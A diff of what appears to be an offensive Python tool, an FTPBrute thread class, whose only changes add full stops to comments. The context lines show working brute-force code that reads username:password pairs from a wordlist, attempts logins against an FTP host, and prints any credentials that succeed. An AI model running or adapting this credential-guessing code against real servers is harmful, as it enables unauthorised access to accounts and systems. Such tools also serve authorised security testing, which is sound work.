@@ -23,20 +23,20 @@ class FTPBrute(threading.Thread):
         :param password:
         :return True:
         """
-        # Initializing FTP client
+        # Initializing FTP client.
         client = ftplib.FTP()
 
         try:
-            # Connecting to FTP server
+            # Connecting to FTP server.
             client.connect(hostname, self.port, timeout=5)
 
-            # Login using the credentials
+            # Login using the credentials.
             client.login(username, password)
         except ftplib.error_perm:
             # Incorrect credentials
             pass
         else:
-            # Connection has been established
+            # Connection has been established.
             print(print_green(f"\n[!] [FTP] Found credentials:\n\tHostname: {hostname}\n\tUsername: "
                               f"{username}\n\tPassword: {password}"))
             return True
@@ -47,12 +47,12 @@ class FTPBrute(threading.Thread):
         :param: self.
         :return:
         """
-        # Read the file
+        # Read the file.
         parent_dir = os.getcwd()
         wordlist_path = os.path.join(parent_dir, "data", "wordlists", "ftp_wordlist.txt")
         cred_list = open(wordlist_path).read().splitlines()
 
-        # Start the brute force
+        # Start the brute force.
         for cred in cred_list:
             username = cred.split(':')[0]
             password = cred.split(':')[1]
